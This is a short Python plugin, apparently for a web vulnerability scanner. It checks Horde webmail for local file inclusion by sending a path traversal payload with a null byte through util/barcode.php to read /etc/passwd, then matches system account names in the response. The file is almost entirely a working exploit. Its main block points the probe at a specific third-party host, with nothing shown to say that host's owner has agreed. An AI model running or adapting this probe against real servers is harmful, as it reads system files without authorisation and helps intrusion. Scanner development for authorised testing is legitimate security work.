#!/usr/bin/env python
#-*- coding:utf-8 -*-
#Refer https://www.exploit-db.com/exploits/16154/ 
#__Author__ = bag 
#_PlugName_ = horde web email Plugin 
#_FileName_ = horde web email.py 
#Web指纹特征：网页含有"Horde Project"字样

import re

def assign(service, arg):
    if service == 'horde_email':
        return True, arg

def audit(arg):
    payload = "util/barcode.php?type=../../../../../../../../../../../etc/passwd%00"
    url = arg + payload
    code, head, body, errcode, _url = curl.curl2(url)
    pattern=re.compile("(root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[a-z]+:\d+:\d+:")
    if code == 200 and pattern.search(body):
        security_warning('Local File Inclusion:'+url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('horde_email', 'http://obama.freecomm.cn/')[1])